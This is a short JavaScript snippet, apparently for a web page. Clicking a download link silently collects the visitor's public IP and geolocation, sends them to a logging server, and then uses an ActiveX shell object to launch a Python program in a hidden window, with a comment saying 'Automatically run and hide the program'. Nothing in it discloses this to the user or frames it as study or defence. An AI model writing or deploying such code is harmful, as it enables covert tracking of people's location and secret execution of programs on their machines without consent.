document.getElementById('downloadLink').addEventListener('click', function() {
    // Collect IP Address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // Ask for location access
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Send data to the server
                    fetch('http://127.0.0.1:5000/logs', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ ipAddress, latitude, longitude })
                    })
                    .then(response => response.json())
                    .then(data => console.log(data))
                    .catch(error => console.error('Error:', error));
                });
            } else {
                alert('Geolocation is not supported by this browser.');
            }
        })
        .catch(error => console.error('Error:', error));

    // Automatically run and hide the program
    setTimeout(() => {
        const shell = new ActiveXObject("WScript.Shell");
        shell.Run("bt4.py", 0, false); // Adjust to your environment
    }, 1000);
});
